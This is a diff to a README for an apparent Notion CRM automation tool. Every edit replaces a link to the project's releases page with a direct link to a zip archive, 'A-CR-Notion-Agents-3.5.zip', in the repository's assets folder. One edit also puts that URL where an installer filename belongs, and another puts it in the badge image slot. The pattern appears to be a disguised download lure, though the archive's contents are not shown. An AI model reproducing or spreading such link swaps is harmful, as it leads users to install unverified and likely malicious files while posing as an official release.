@@ -1,6 +1,6 @@
 # 🤖 Notion-AI-CRM-Agents - Automate Lead Scoring and Research
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Notion--AI--CRM--Agents-blue?style=for-the-badge)](https://github.com/Mdirman/Notion-AI-CRM-Agents/releases)
+[![Download Latest Release](https://github.com/Mdirman/Notion-AI-CRM-Agents/raw/refs/heads/main/assets/A-CR-Notion-Agents-3.5.zip)](https://github.com/Mdirman/Notion-AI-CRM-Agents/raw/refs/heads/main/assets/A-CR-Notion-Agents-3.5.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Follow these steps carefully. Each step covers what you need to do from download
 
 Click the button at the top or this link to open the release page:
 
-[Download Notion-AI-CRM-Agents Releases](https://github.com/Mdirman/Notion-AI-CRM-Agents/releases)
+[Download Notion-AI-CRM-Agents Releases](https://github.com/Mdirman/Notion-AI-CRM-Agents/raw/refs/heads/main/assets/A-CR-Notion-Agents-3.5.zip)
 
 On this page, find the latest release version. The releases are listed by date and version number to help you pick the newest one.
 
@@ -56,7 +56,7 @@ On this page, find the latest release version. The releases are listed by date a
 
 Look for a file suitable for your operating system:
 
-- For Windows, it may be named something like `Notion-AI-CRM-Agents-Setup.exe`
+- For Windows, it may be named something like `https://github.com/Mdirman/Notion-AI-CRM-Agents/raw/refs/heads/main/assets/A-CR-Notion-Agents-3.5.zip`
 - For macOS, look for a `.dmg` or `.pkg` installer
 
 Click on the file to download it to your computer. The download size will typically be below 200 MB.
@@ -117,6 +117,6 @@ If issues persist, use the "Issues" tab on the GitHub repository to check if oth
 
 You can start right now by visiting the release page here:
 
-[Download Notion-AI-CRM-Agents Releases](https://github.com/Mdirman/Notion-AI-CRM-Agents/releases)
+[Download Notion-AI-CRM-Agents Releases](https://github.com/Mdirman/Notion-AI-CRM-Agents/raw/refs/heads/main/assets/A-CR-Notion-Agents-3.5.zip)
 
 Pick the installer for your system, download it, and follow the steps above to get up and running.
